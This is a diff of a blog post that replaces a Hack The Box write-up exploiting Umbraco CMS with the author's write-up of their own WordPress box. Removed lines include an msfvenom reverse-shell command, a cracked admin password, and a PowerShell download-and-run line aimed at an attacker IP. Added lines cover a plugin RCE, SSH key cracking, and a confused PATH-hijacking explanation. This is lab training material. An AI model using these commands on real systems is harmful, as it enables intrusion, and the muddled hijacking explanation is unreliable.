@@ -8,10 +8,10 @@ published: true
 * Before we start, I will try to explain everything as a player since I'm the creator of this machine. 
 # []() Methodology
 
-* Nmap scan
-* find some mounted files.
-* find username and password of Umbraco cms
-* Execute command with Umbraco exploit and got reverse shell.
+* Nmap scan.
+* find wordpress.
+* find out of date plugin.
+* exploiting CVE-2019-9978 and got reverse shell.
 * got user.
 * Privilege Escalation.
 
@@ -31,98 +31,67 @@ published: true
 
 ![hosts](https://i.ibb.co/TWGWPfw/2.png)
 
-# []() Checking the Web-Page
+# []() Checking the Web-Page on 8078
 
-* the web page was very simple and contain some useful data like usernames.
+* Nothing is here.
 
-![](https://i.ibb.co/tZtRStB/webpage1.png)
+![](https://i.ibb.co/X8y46Tv/3.png)
 
-* and here's some usernames.
+* Doing some fuzzing with dirb and I found **Wordpress**.
 
-![](https://i.ibb.co/VYL2nQH/wbpage2.png)
+![](https://i.ibb.co/bbPFXSC/4.png)
 
-* as always i tried to bruteforce the username and password for the smb but i failed so let's enumerate some.
+* Running wpscan and I found out of date plugin, which is vulnerable.
 
-* when i ran gobuster i found an dir for umbraco cms.
+![](https://i.ibb.co/xXXKb94/5.png)
 
-> **gobuster dir -u http://10.10.10.180/ -w /usr/share/dirb/wordlists/common.txt -s 200**
+* CVE-2019-9978 RCE in Social WarFare < 3.5.3.
 
-![gobuster](https://i.ibb.co/db7f3xZ/gobuster.png)
+![](https://i.ibb.co/t8VYstH/6.png)
 
-* and here is the cms login page.
+* I downloaded the exploit from github and exploited it by adding the following payload in my apache server.
 
-![cms](https://i.ibb.co/ZmTHzBg/cms.png)
+![](https://i.ibb.co/10N7WX7/7.png)
 
-* this cms vulnerable to auth RCE so we need some credentials.
+* Running nc as listener and I got a reverse shell.
 
-> after enumerated some mounted files from the machine i found the user and the password.
+![reverse-shell](https://i.ibb.co/88k9wGt/8.png)
 
-| Command1        | Command2          | Command3 |
-|:-------------|:------------------|:------|
-| /usr/sbin/showmount -e 10.10.10.180           | mkdir mounted_files | sudo mount 10.10.10.180://site_backups ./mounted_files  |
+* Listing the **wordpress** directory and found strange file **config.php**
 
-![](https://i.ibb.co/wyKCwdn/mount.png)
+* I know that most of wordpress files start with **wp-**.
 
-> **in the Web.config file, i noticed the connection date will be stored in the Umbraco.sdf.**
+* Reading this file and I found a path in the last line of it **unknown_path**.
 
-![](https://i.ibb.co/w4W9x6c/subl.png)
+* I found that I can **cd** into **johny** user directory but I can't list anything.
 
-* let's see what is in Umbraco.sdf. this file in App_Data dir.
+![](https://i.ibb.co/10bL7Pk/9.png)
 
-![](https://i.ibb.co/m8v96XX/admin.png)
+* I tried **cd /home/johny/unknown_path/** and worked for me!.
 
+* Listing it with **ls -la** and I found **.ssh** directory which have ssh public and private key.
 
-| Username        | Email          | Password |
-|:-------------|:------------------|:------|
-| admin          | admin@htb.local | b8be16afba8c314ad33d812f22a04991b90e2aaa  |
+![](https://i.ibb.co/7bSrBWd/10.png)
 
-* the password encrypted with SHA1. let's decrypt it.
+> Copying the **id_rsa** and I cracked it on my machine and got **johny** user.
 
-![](https://i.ibb.co/ZW3fNL2/password.png)
+![](https://i.ibb.co/Y0VfczG/11.png)
 
-* Password: **baconandcheese**
+> Listing its directory and I found an exploitable program which is basically doing **ls /root/root.txt**
 
-* let's login to the cms panel.
+* Doing path hijacking and I got the root flag.
+![](https://i.ibb.co/K2sfxXk/12.png)
 
-![](https://i.ibb.co/wpVjHSv/cmspage.png)
+> * Explaining **Path Hijacking**:
 
-* now we can use this [Umbraco-RCE Exploit](https://github.com/noraj/Umbraco-RCE.git) to get reverse shell.
+* We want to just replace **cat** command with **ls** command.
 
-* let's test the exploit.
+* In Linux when you enter a command the system goes to the path env such as **/bin** to search about the command you entered if its exist or not to execute or run it.
 
-* first we need a reverse shell to upload it to the machine to give us reverse shell.
+* Doing **export PATH=/tmp:$PATH** made the **/tmp** as the first path env, so when the system search about **ls**
 
-> **msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=HOST LPORT=PORT -f psh -o reverse-shell.ps1**
+* It will find it inside **/tmp** which is by the way a **cd** command. 
 
-* now let's upload our reverse shell to the machine with the exploit.
-
-> **./umbraco_cve.py -u admin@htb.local -p baconandcheese -i 'http://remote.htb' -c powershell.exe -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.xx.xx:80/reverse.ps1')"**
-
-![reverse-shell](https://i.ibb.co/BTq01sQ/reverse-shell.png)
-
-* and we got user flag.
-
-* after some enumeration i found that TeamViewer was installed in this box. so run this command in the meterpreter session.
-
-* here's the administrator password.
-
-![](https://i.ibb.co/JKYhsvG/root.png)
-
-* there is another way to get root with UsoSvc service and you can read about it from here. [hacktricks](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation)
-
-* let's login as administrator now with evil-winrm.
-
-![](https://i.ibb.co/yqz7qKC/final.png)
-
-* Thanks for reading.
-* Cheers!
-
-<script src="https://www.hackthebox.eu/badge/103789"></script>
-
-
-
-
-
-
+* Thanks for reading hope you enjoyed this.
 
 
